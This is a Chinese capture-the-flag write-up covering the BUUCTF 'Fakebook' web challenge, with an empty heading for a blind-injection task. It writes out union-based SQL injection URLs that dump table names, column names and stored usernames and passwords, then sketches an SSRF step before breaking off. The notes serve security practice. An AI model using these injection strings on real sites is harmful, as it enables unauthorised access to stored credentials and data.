title: buuctf4月28日
date: 2024-4-28 16:30:25
tags: [buuctf,ctf]
categories: 刷题笔记

## [CISCN2019 华北赛区 Day2 Web1]Hack World

### 盲注：脚本

## [网鼎杯 2018]Fakebook

先用dirsearch扫一遍，有一个robots.txt，里面有个文件，直接打开下载源码，发现

![image-20240427123209441](C:\Users\86182\assets\image-20240427123209441.png)

先注册吧，注册进去有个超链接的名字点进去

![image-20240427123321011](C:\Users\86182\assets\image-20240427123321011.png)

有参数可以注入，sql注入，发现是数字型，且在第二个数字这里有回显，直接可以注入，找表，列，以及数据

/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’fakebook’–+得到表名**

**user/view.php?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=’fakebook’ and table_name=’users’–+得到列名

/view.php?no=0 union/**/select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users –+得到数据

发现数据中有个序列化的数据

![image-20240427123819254](C:\Users\86182\assets\image-20240427123819254.png)

与下载文件重合name,blog,age这三个都是那个文件的参数，这里我们并没有得到flag，而是我们个人资料的反序列化数据，因为在数据中存在我们的博客地址，所以我们尝试使用ssrf读取flag，但是我们并不知道flag所在文件夹，用dirsearch扫描发现flag.php和robots.txt

知识点：ssrf漏洞：

